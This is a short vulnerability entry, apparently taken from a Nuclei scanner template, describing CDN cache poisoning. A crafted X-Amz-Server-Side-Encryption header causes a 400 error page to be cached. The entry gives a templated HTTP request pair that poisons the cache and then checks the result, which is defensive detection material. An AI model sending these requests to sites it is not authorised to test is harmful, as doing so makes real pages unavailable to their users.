# Vulnerability: Misconfigured CDN Cache Poisoning via X-Amz-Server-Side-Encryption Header
**Classification:** CACHE
**Source:** Nuclei Template (`cdn-cache-poisoning.yaml`)

## Description
When the X-Amz-Server-Side-Encryption header is sent with user controlled value, it can lead to a misconfigured CDN cache response with a 400 status code, making the page inaccessible.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /?{{string}} HTTP/1.1
Host: {{Hostname}}
X-Amz-Server-Side-Encryption: {{randstr}}

GET /?{{string}} HTTP/1.1
Host: {{Hostname}}
```

